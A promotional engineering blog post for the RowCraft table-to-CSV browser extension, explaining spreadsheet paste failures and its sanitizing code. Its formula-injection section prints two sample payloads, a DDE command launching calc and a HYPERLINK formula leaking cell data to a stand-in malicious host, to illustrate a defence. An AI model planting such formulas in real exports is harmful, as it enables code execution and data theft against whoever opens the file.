# Why Pasting Web Tables Destroys Excel Rows (And How RFC 4180 & DDE Sanitization Solve It)

Every data analyst, financial operator, and researcher has experienced the same frustration: you highlight a table on a webpage, press `Ctrl+C`, switch to Microsoft Excel or Google Sheets, press `Ctrl+V`, and the spreadsheet explodes into a jagged mess of misaligned columns, fractured rows, and garbled characters.

Here is the exact engineering breakdown of why standard browser copy-paste fails on modern web tables—and how **RowCraft** solves all four failure modes in local browser memory.

---

## 1. The Multi-Line Cell Fracture (`<br>`, `<div>`, `<p>`)

In modern SaaS dashboards (Stripe, Jira, GitHub, Salesforce, Wikipedia), a single `<td>` or ARIA `[role="gridcell"]` rarely contains a flat text node. Instead, it contains stacked HTML elements:

```html
<td>
  <div>Enterprise Tier</div>
  <br />
  <span>Renewal: Q4</span>
</td>
```

When you copy and paste this cell directly from the browser, the clipboard serializes those internal block elements and `<br>` tags as `\r\n` newline characters. When Excel parses tab-separated clipboard text, **every unescaped `\r\n` starts a brand-new row**, splitting a single record across three rows and shifting every subsequent column out of alignment.

### How RowCraft Fixes It
Before serializing any cell, RowCraft clones the DOM node, strips non-visible tags (`<script>`, `<style>`, `<template>`), replaces `<br>` tags and block boundaries (`<div>`, `<p>`, `<li>`) with single space text nodes, and normalizes whitespace:

```ts
export function sanitizeCellText(rawText: string): string {
  const collapsed = rawText
    .replace(/[\r\n\t\u00A0]+/g, ' ')
    .replace(/\s{2,}/g, ' ')
    .trim();
  // ...
}
```

Result: **1 web table row = 1 spreadsheet row**, 100% of the time.

---

## 2. OWASP CSV Formula Injection & DDE Exploits (`=`, `+`, `-`, `@`)

A lesser-known security hazard of exporting web tables is **Spreadsheet Formula Injection** (also known as Dynamic Data Exchange or DDE injection, cataloged by OWASP).

If a user-generated table cell on a webpage starts with `=`, `+`, `-`, `@`, `\t`, or `\r`—for example:

```text
=CMD|' /C calc'!A0
=HYPERLINK("https://malicious.example/leak?data="&A1, "Click here")
```

Opening that exported CSV or `.xlsx` file in Microsoft Excel or Google Sheets can cause the spreadsheet engine to execute the cell as a live formula rather than displaying it as text.

### How RowCraft Fixes It Without Breaking Negative Currency
Naive sanitizers prefix *every* `-` or `+` with an apostrophe, which ruins negative numbers (`-42.50`), negative currency (`-$1,250.00`), and empty dash placeholders (`--`). RowCraft uses a context-aware guard in `src/utils/security.ts`:

```ts
export function sanitizeFormulaInjection(input: string): string {
  if (!input) return '';
  if (/^[=+\-@\t\r]/.test(input)) {
    // Preserve signed numbers/currency (-42.50, -$1,250.00, +12.5%) and dash placeholders (--)
    if (/^[+-]\s*[$€£¥₪]?\s*\d/u.test(input) || /^-+$/.test(input)) {
      return input;
    }
    return `'${input}`;
  }
  return input;
}
```

---

## 3. Microsoft Excel's Hard 32,767-Character Cell Limit

Microsoft Excel enforces a strict specification limit of **32,767 characters** per cell. When scraping admin logs, API payloads, or long descriptions inside a table, a single cell exceeding 32,767 characters can trigger Excel's `"We found a problem with some content in filename.xlsx"` corruption dialog.

RowCraft automatically enforces `slice(0, 32767)` per cell prior to both RFC 4180 CSV generation and SheetJS `.xlsx` workbook assembly.

---

## 4. The Missing `\uFEFF` UTF-8 Byte Order Mark (BOM)

When you save a standard UTF-8 CSV without a Byte Order Mark (`\uFEFF`) and double-click it in Microsoft Excel on Windows, Excel defaults to legacy Windows-1252 / ANSI encoding—turning Hebrew (`שלום עולם`), Japanese (`日本語`), and European diacritics (`Café naïve`) into unreadable mojibake (`×©×œ×•× `).

RowCraft prepends `\uFEFF` at byte offset `0` of every CSV export, signaling Excel to immediately decode the file as UTF-8.

---

### Try It Free
- **Chrome Extension (1-Click on Any Website):** [Table to CSV & Excel: RowCraft Extractor on Chrome Web Store](https://chromewebstore.google.com/detail/ofhajfbdajpjidhcpbofkoeaegjjafeg)
- **Online Browser Utility:** [RowCraft Online HTML Table to CSV Converter](https://talofer.github.io/rowcraft/)
